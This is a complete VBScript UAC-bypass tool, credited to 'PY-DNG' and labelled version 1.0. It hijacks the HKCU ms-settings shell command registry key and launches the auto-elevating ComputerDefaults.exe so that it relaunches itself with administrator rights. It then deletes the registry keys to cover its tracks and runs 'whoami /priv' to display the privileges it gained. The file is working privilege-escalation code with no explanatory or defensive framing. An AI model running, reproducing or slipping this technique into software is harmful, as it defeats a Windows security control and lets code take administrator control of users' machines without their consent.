Call BypassUAC(1, False)

Dim ws
Set ws = CreateObject("Wscript.Shell")
ws.Run "cmd /k whoami /priv"



Function BypassUAC(ByVal Host, ByVal Hide)
	''' BypassUAC By PY-DNG; Version 1.0 '''
	On Error Resume Next: Err.Clear
	
	' Get COM Objects
	Dim FSO, ws
	Dim SelfFolderPath, UserName, Self
	Set FSO = CreateObject("Scripting.FileSystemObject")
	Set ws = CreateObject("Wscript.Shell")
	
	Dim HostName, Args, i, Argv, TFPath, HaveUAC
	If Host = 1 Then HostName = "wscript.exe"
	If Host = 2 Then HostName = "cscript.exe"
	
	' Get All Arguments
	Set Argv = WScript.Arguments
	For Each Arg in Argv
		Args = Args & " " & Chr(34) & Arg & Chr(34)
	Next
	
	' Test If We Have UAC
	TFPath = FSO.GetSpecialFolder(WindowsFolder) & "\system32\UACTestFile"
	FSO.CreateTextFile TFPath, True
	HaveUAC = FSO.FileExists(TFPath) And Err.number <> 70
	If HaveUAC Then FSO.DeleteFile TFPath, True
	
	' If No UAC Then Get It Else Check & Correct The Host And Delete Regs
	If Not HaveUAC Then
		ws.RegWrite "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\DelegateExecute", "", "REG_SZ"
		ws.RegWrite "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\", "wscript.exe " & Chr(34) & WScript.ScriptFullName & chr(34) & " uac" & Args, "REG_SZ"
		ws.Run "ComputerDefaults.exe"
		WScript.Quit
	ElseIf LCase(Right(WScript.FullName,12)) <> "\" & HostName Then
		ws.Run HostName & " //e:VBScript """ & WScript.ScriptFullName & """" & Args, Int(Hide)+1, False
		WScript.Quit
	Else
		ws.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command\"
		ws.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\"
		ws.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\"
		ws.RegDelete "HKEY_CURRENT_USER\Software\Classes\ms-settings\"
	End If
End Function